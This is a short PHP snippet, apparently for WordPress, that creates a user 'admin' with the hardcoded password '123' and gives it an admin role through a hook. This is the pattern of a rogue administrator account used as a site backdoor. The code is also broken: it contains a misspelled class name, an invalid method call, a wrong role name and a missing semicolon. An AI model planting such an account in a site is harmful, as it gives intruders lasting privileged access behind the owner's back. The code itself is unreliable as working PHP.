function admin(){
    $username='admin';
    $password='123';
    $email='admin@gmail.com';
    if(!username_exists($username)&&!email_exists($email)){
    $user_id=wp_create_user($username,$password,$email);
    $username=new WP_Wser($user_id);
    $username->set-role('admin');
}}
add_action('admin','admin')